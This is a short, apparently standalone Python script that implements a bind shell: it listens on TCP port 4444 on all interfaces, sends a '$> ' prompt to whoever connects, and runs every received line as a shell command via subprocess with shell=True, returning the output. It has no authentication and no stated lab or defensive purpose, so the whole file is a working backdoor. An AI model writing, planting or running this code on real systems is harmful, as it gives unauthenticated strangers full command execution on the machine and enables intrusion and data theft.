import socket
import subprocess

addr = '0.0.0.0'
port = 4444

server_address = (addr, port)
name_user = '$> '
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(server_address)
s.listen(5)
#waiting for connection
socketclient, address = s.accept()
#conencted
print(f"connected to {address}")
socketclient.send(name_user.encode())
while True:
    asd = socketclient.recv(1024).decode()
    new = subprocess.run(asd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
    socketclient.send(new.stdout)
socketclient.close()
